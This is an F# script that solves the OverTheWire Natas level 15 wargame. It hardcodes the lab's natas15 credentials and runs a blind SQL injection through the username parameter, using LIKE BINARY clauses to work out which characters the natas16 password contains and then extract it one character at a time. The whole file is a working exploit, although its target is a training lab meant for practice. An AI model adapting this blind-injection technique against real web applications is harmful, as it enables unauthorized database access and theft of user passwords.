open System
open System.Net
open System.IO

let url = "http://natas15.natas.labs.overthewire.org/?username=natas16\" and password like binary \""
let credentials = "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let check passwordClause =
    let fullUrl = url + passwordClause
    let http = HttpWebRequest.CreateHttp fullUrl
    http.Headers.Add(basicAuth)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    let html = reader.ReadToEnd ()
    html.Contains "This user exists."

let chars = Array.concat [[|'a'..'z'|]; [|'A'..'Z'|]; [|'0'..'9'|]] 

printfn "calculating valid characters from set of %i..." chars.Length
let valid = 
    chars |> Array.filter (fun c -> check ("%" + string c + "%"))
printfn "found %i characters. proceeding with bruteforce..." valid.Length

let rec blindFinder soFar =
    let toTest = valid |> Array.map (fun c -> soFar + string c)
    let next = toTest |> Array.find (fun s -> check (s + "%"))
    printfn "%s" next
    if next.Length = 32 then 
        printfn "natas16's password: %s" next
    else
        blindFinder next

blindFinder ""